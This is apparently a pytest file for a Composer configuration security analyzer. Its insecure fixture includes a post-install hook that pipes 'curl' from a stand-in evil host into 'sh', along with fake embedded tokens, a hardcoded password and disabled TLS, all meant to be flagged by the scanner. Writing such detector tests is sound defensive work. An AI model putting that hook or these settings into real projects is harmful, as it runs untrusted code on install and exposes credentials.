"""Tests for ComposerAnalyzer."""

from pathlib import Path

from devai.composer_analyzer import ComposerAnalyzer, ComposerFinding


INSECURE_COMPOSER_JSON = """\
{
    "name": "example/demo",
    "require": {
        "symfony/console": "*",
        "vendor/unstable": "dev-master"
    },
    "repositories": [
        {
            "type": "vcs",
            "url": "https://user:secret-token@github.com/private/repo.git"
        },
        {
            "type": "composer",
            "url": "http://insecure-packagist.example"
        }
    ],
    "config": {
        "secure-http": false,
        "disable-tls": true,
        "allow-plugins": true
    },
    "minimum-stability": "dev",
    "scripts": {
        "post-install-cmd": "curl -s http://evil.example/install.sh | sh"
    }
}
"""

INSECURE_AUTH_JSON = """\
{
    "github-oauth": {
        "github.com": "ghp_abcdefghijklmnopqrstuvwxyz1234567890"
    },
    "http-basic": {
        "repo.example.com": {
            "username": "deploy",
            "password": "hardcoded-composer-password"
        }
    }
}
"""

HARDENED_COMPOSER_JSON = """\
{
    "name": "example/demo",
    "require": {
        "symfony/console": "^7.0"
    },
    "config": {
        "secure-http": true,
        "allow-plugins": {
            "composer/installers": true
        }
    },
    "minimum-stability": "stable",
    "prefer-stable": true
}
"""


class TestComposerAnalyzer:
    def test_no_configs_returns_perfect_score(self, tmp_path: Path):
        (tmp_path / "app.py").write_text("x = 1\n", encoding="utf-8")
        analyzer = ComposerAnalyzer(str(tmp_path))
        assert analyzer.stats.configs == 0
        assert analyzer.health_score() == 100.0

    def test_detects_composer_json(self, tmp_path: Path):
        (tmp_path / "composer.json").write_text(HARDENED_COMPOSER_JSON, encoding="utf-8")
        (tmp_path / "composer.lock").write_text("{}\n", encoding="utf-8")
        analyzer = ComposerAnalyzer(str(tmp_path))
        assert analyzer.stats.configs == 1

    def test_detects_insecure_patterns(self, tmp_path: Path):
        (tmp_path / "composer.json").write_text(INSECURE_COMPOSER_JSON, encoding="utf-8")
        (tmp_path / "auth.json").write_text(INSECURE_AUTH_JSON, encoding="utf-8")
        analyzer = ComposerAnalyzer(str(tmp_path))
        findings = analyzer.analyze()
        kinds = {f.kind for f in findings}
        assert "scm_credentials" in kinds
        assert "insecure_http" in kinds
        assert "dev_version" in kinds
        assert "tls_disabled" in kinds
        assert "allow_plugins_wildcard" in kinds
        assert "minimum_stability_dev" in kinds
        assert "curl_pipe_shell" in kinds
        assert "committed_auth" in kinds
        assert "hardcoded_secret" in kinds
        assert "composer_token" in kinds
        assert "missing_lock" in kinds
        assert analyzer.health_score() < 50.0

    def test_hardened_config_has_no_high_findings(self, tmp_path: Path):
        (tmp_path / "composer.json").write_text(HARDENED_COMPOSER_JSON, encoding="utf-8")
        (tmp_path / "composer.lock").write_text("{}\n", encoding="utf-8")
        analyzer = ComposerAnalyzer(str(tmp_path))
        findings = analyzer.analyze()
        high = [f for f in findings if f.severity == "high"]
        assert high == []

    def test_finding_format(self):
        finding = ComposerFinding(
            kind="test",
            severity="high",
            message="test message",
            path="composer.json",
            lineno=1,
            line="test",
        )
        assert "composer.json:1" in finding.format()

    def test_generate_hardened_config(self):
        analyzer = ComposerAnalyzer(".")
        config = analyzer.generate_hardened_config()
        assert '"secure-http": true' in config
        assert '"minimum-stability": "stable"' in config

    def test_to_context(self, tmp_path: Path):
        (tmp_path / "composer.json").write_text(HARDENED_COMPOSER_JSON, encoding="utf-8")
        (tmp_path / "composer.lock").write_text("{}\n", encoding="utf-8")
        analyzer = ComposerAnalyzer(str(tmp_path))
        context = analyzer.to_context()
        assert "Composer analysis:" in context
        assert "health score" in context
